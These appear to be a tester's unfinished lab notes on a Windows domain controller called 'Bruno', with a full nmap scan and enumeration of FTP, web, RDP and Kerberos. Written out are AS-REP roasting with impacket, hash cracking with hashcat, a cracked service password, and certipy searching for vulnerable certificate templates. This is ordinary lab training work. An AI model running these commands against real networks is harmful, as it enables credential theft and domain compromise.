```JavaScript
# Nmap 7.95 scan initiated Tue Dec  2 04:51:26 2025 as: /usr/lib/nmap/nmap --privileged -sC -sV -p- --min-rate=10000 -o bruno.scan 10.129.238.9
Nmap scan report for 10.129.238.9
Host is up (0.097s latency).
Not shown: 65513 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 06-29-22  04:55PM       <DIR>          app
| 06-29-22  04:33PM       <DIR>          benign
| 06-29-22  01:41PM       <DIR>          malicious
|_06-29-22  04:33PM       <DIR>          queue
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-12-02 12:51:43Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: bruno.vl0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:brunodc.bruno.vl, DNS:bruno.vl, DNS:BRUNO
| Not valid before: 2025-10-09T09:54:08
|_Not valid after:  2105-10-09T09:54:08
|_ssl-date: 2025-12-02T12:53:15+00:00; -4s from scanner time.
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=bruno-BRUNODC-CA
| Not valid before: 2022-06-29T13:23:01
|_Not valid after:  2121-06-29T13:33:00
|_ssl-date: TLS randomness does not represent time
|_http-title: IIS Windows Server
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap
|_ssl-date: 2025-12-02T12:53:15+00:00; -4s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:brunodc.bruno.vl, DNS:bruno.vl, DNS:BRUNO
| Not valid before: 2025-10-09T09:54:08
|_Not valid after:  2105-10-09T09:54:08
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: bruno.vl0., Site: Default-First-Site-Name)
|_ssl-date: 2025-12-02T12:53:15+00:00; -4s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:brunodc.bruno.vl, DNS:bruno.vl, DNS:BRUNO
| Not valid before: 2025-10-09T09:54:08
|_Not valid after:  2105-10-09T09:54:08
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: bruno.vl0., Site: Default-First-Site-Name)
|_ssl-date: 2025-12-02T12:53:15+00:00; -4s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:brunodc.bruno.vl, DNS:bruno.vl, DNS:BRUNO
| Not valid before: 2025-10-09T09:54:08
|_Not valid after:  2105-10-09T09:54:08
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-12-02T12:53:15+00:00; -4s from scanner time.
| ssl-cert: Subject: commonName=brunodc.bruno.vl
| Not valid before: 2025-10-08T09:36:40
|_Not valid after:  2026-04-09T09:36:40
| rdp-ntlm-info: 
|   Target_Name: BRUNO
|   NetBIOS_Domain_Name: BRUNO
|   NetBIOS_Computer_Name: BRUNODC
|   DNS_Domain_Name: bruno.vl
|   DNS_Computer_Name: brunodc.bruno.vl
|   DNS_Tree_Name: bruno.vl
|   Product_Version: 10.0.20348
|_  System_Time: 2025-12-02T12:52:35+00:00
9389/tcp  open  mc-nmf        .NET Message Framing
49373/tcp open  msrpc         Microsoft Windows RPC
49378/tcp open  msrpc         Microsoft Windows RPC
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
56450/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
56453/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: BRUNODC; OS: Windows; CPE: cpe:/o:microsoft:windows
Host script results:
| smb2-time: 
|   date: 2025-12-02T12:52:36
|_  start_date: N/A
|_clock-skew: mean: -4s, deviation: 0s, median: -4s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Dec  2 04:53:23 2025 -- 1 IP address (1 host up) scanned in 117.03 seconds
```
  
# Anonymous SMB, RPC, LDAP
![image 136.png](assets/Bruno/image%20136.png)
- nothing of note
  
# Anonymous FTP
![image 1 102.png](assets/Bruno/image%201%20102.png)
  
trying to open the exe with wine, says it’s a DOS executable
![image 2 101.png](assets/Bruno/image%202%20101.png)
- use dosbox to open it up
    
    - lead nowhere
    
  
changelog has a username svc_scan
![image 3 94.png](assets/Bruno/image%203%2094.png)
  
# HTTP
![image 4 89.png](assets/Bruno/image%204%2089.png)
- certenroll (potential ESC exploit at the end)
![image 5 87.png](assets/Bruno/image%205%2087.png)
- no subdomains
  
# HTTPS
![image 6 82.png](assets/Bruno/image%206%2082.png)
- same thing as HTTP
![image 7 79.png](assets/Bruno/image%207%2079.png)
- no subdomains
  
  
# RDP
![image 8 75.png](assets/Bruno/image%208%2075.png)
- no guest creds
  
  
# Kerberos
svc_scan had pre-auth disabled
![image 9 72.png](assets/Bruno/image%209%2072.png)
```JavaScript
hashcat -m 18200 svc_scan.hash /usr/share/wordlists/rockyou.txt
```
![image 10 62.png](assets/Bruno/image%2010%2062.png)
svc_net also has pre-auth disabled
```JavaScript
impacket-GetNPUsers bruno/svc_scan:'Sunshine1' -dc-ip 10.129.238.9 -request -usersfile users.txt
```
![image 10 62.png](/image%2010%2062.png)
  
# SMB
After getting password for svc_scan (see Kerberos), we get a valid domain user
![image 11 58.png](assets/Bruno/image%2011%2058.png)
  
  
# CA
```JavaScript
certipy-ad find -u svc_scan -p Sunshine1 -dc-ip 10.129.238.9 -vulnerable -stdout
```
![image 12 49.png](assets/Bruno/image%2012%2049.png)
  
![image 13 49.png](assets/Bruno/image%2013%2049.png)
- will come back to this
    
    - even if it doesn’t work, take notes for ESC8
    
  
# RPC
once authenticated, can get domain users
```JavaScript
rpcclent -U 'svc_scan' 10.129.238.9
```
![image 14 45.png](assets/Bruno/image%2014%2045.png)